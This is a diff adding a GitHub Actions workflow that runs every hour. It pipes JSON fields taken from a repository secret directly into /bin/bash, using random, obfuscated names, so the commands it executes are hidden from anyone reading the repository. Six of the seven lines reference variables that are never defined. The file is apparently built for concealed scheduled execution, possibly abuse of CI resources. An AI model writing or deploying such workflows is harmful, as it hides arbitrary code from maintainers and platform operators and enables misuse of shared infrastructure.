@@ -1,0 +1,23 @@
+name: songjiangyue001
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 * * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: songjiangyue001
+        env:
+          jjlr653: ${{ secrets.jjlr653 }}
+        run: |
+          echo $jjlr653 | jq -r .r223 | /bin/bash
+          echo $pfkzx25 | jq -r .d2 | /bin/bash
+          echo $lffo7567 | jq -r .ixwb087 | /bin/bash
+          echo $fw513 | jq -r .agn12 | /bin/bash
+          echo $qnkql7297 | jq -r .ipik2 | /bin/bash
+          echo $c99 | jq -r .ojk11985 | /bin/bash
+          echo $on33 | jq -r .tfhj606 | /bin/bash
+
